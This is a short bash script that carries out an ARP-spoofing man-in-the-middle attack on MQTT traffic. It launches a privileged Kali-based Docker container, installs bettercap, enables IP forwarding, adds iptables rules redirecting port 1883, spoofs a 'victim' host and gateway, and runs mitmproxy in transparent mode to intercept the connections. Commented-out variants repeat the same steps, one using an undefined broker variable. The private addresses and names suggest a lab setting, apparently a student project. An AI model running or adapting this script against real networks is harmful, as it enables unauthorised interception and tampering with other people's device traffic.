#!/bin/bash
ip_victima=192.168.0.19
gw=192.168.0.20
interface=wlp42s0

#sudo docker run -d --name mitm  --privileged --network host -v "$(pwd)/escaner":/home kalitfg sleep infinity
#sudo docker exec -it mitm bash -c "sudo iptables -t nat -A PREROUTING -p tcp --dport 1883 -j REDIRECT && sudo iptables -t nat -A POSTROUTING -p tcp --dport 1883 -j SNAT --to-source $ip_victima" 
#sudo docker exec -it mitm bash -c "apt update && apt install -y bettercap && bettercap -iface wlp42s0 -eval "set tcp.proxy.port 1883; set tcp.address $ip_broker; set tcp.port 1883; tcp.proxy on; set arp.spoof.fullduplex true; set arp.spoof.targets $ip_victima; arp.spoof on"" 


sudo docker run -d --name mitm  --privileged --network host -v "$(pwd)/escaner":/home kalitfg sleep infinity
sudo docker exec -it mitm bash -c "apt update && apt install -y bettercap && sysctl -w net.ipv4.ip_forward=1 && iptables -t nat -A PREROUTING -p tcp --dport 1883 -j REDIRECT && iptables -t nat -A POSTROUTING -p tcp --dport 1883 -j SNAT --to-source $ip_victima" 
sudo docker exec -d mitm bash -c "bettercap -iface wlp42s0 -eval \"set arp.spoof.fullduplex true; set arp.spoof.targets $ip_victima, $gw; arp.spoof on\"" 
sudo docker exec -it mitm bash -c "mitmproxy --mode transparent --listen-port 1883 --tcp-hosts '.*'"
